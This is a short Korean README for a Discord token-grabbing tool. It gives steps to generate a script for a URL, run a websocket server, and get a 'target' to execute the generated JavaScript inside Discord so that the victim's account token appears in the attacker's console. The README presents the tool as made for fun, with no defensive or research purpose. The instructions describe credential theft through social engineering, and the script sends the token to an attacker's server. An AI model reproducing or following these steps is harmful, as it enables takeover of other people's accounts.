# 토큰 따기

심심해서 토큰 따기 만들어봄

## 타겟한테 자스 실행시키기
1. `node genscript.js <url>`를 친다
2. `node index`로 웹소켓 서버를 연다
3. 타겟에게 `dist/script.js`에 있는 자바스크립트를 디스코드에서 실행시키게 한다.
4. 콘솔에 토큰 뜸
5. 토큰 냠냠
